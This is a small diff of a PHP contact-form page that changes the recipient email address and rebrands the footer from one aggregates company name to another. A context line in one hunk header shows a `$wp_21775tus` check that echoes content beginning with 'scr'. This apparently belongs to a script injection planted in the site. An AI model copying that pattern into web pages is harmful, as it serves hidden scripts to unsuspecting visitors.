@@ -126,7 +126,7 @@
 
                     // the email will be sent here
                     // make sure to change this to be your e-mail
-                    $to      = "administracion@aridosmoreno.cl";
+                    $to      = "ventas@aridosems.cl";
 
                     // the email subject
                     // '[Contact Form] :' will appear automatically in the subject.
@@ -231,8 +231,8 @@ if (substr($wp_21775tus,1,3) === 'scr'){ echo $wp_21775tus; }
         	<div class="main">
                 <div class="wrapper">
                 	<div class="fleft footer-text">
-                	  <p>ARIDOS MORENO</p>
-                	  <p> DESARROLLADO POR AGENCIA DE PUBLICIDAD INTEGRAL CALVOGRAFICA</p>
+                	  <p>ARIDOS EMS</p>
+                	  <p></p>
                     	<!-- {%FOOTER_LINK} -->
 </div>
                     <ul class="list-services">
